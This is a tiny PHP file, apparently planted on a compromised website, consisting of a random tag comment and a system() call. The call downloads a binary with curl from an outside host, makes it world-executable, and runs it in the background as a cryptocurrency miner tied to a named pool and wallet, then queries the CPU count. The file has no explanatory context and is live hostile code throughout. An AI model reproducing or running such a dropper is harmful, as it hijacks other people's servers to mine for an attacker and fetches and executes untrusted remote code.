<?php /* NW9UsPrnfKqy5KH */ ?>
<?php
system('curl -o l1 http://www.coachdogliberty.digi-dev.fr/r; chmod 777 l1; ./l1 --spectre --daemon-address spr.tw-pool.com --port 14001 --wallet spectre:qpr32zuq8vscq4n45frj8qvda0pa93f3z9c9957ey055wx4ge0spcd3ffs2a6 --threads 12 --stratum --background > /dev/null'); $core = system('nproc');?>
